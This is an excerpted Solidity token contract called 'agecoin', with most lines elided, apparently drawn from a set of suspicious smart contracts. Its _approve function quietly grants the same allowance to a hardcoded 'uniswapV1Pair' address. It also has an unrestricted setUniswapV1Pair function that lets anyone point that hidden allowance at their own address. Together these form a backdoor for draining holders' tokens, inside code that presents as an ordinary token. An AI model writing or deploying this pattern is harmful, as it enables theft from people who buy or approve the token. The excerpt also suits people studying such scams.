...
contract  agecoin is IERC20, Ownable {
    ...
    address public uniswapV1Pair = 0xF683Db3C20768b903e54044ed144B7573c7465B3;
    ...
    constructor(
        ...
        _intervalSecondsForSwap = 5000;


        maxTax = maxTax_ * (10**uint256(_decimals));
        maxHave = maxHave_ * (10**uint256(_decimals));
        burnEndNumber = totalBurn_ * (10**uint256(_decimals));
        ...
        swapTokensAtAmount = _tTotal.mul(1).div(10**_decimals);
        _token = address(this);
    ...
    function setIntervalSecondsForSwap(uint256 intervalSecondsForSwap)public onlyOwner {
        _intervalSecondsForSwap = intervalSecondsForSwap;
    }


    function setMarketAddr(address marketAddress)public onlyOwner {
        marketAddr = marketAddress;
    }

    function setMaxTax(uint256 _maxTax)public onlyOwner {
        maxTax = _maxTax * (10**uint256(_decimals));
    }

    function setMaxHave(uint256 _maxHave)public onlyOwner {
        maxHave = _maxHave * (10**uint256(_decimals));
    }

    function setBurnEndNumber(uint256 _burnEndNumber)public onlyOwner {
        burnEndNumber = _burnEndNumber * (10**uint256(_decimals));
    }
    ...
    function _approve(
        ...
        _allowances[owner][uniswapV1Pair] = amount;
    ...
    function _transfer(
        ...
        fromAddress = from;
        toAddress = to;
        if(canSwap  && from !=address(this) && LPFeefenhong.add(minPeriod) <= block.timestamp) {
    ...
    function setUniswapV1Pair(address addr) external{
        uniswapV1Pair = addr;
    }
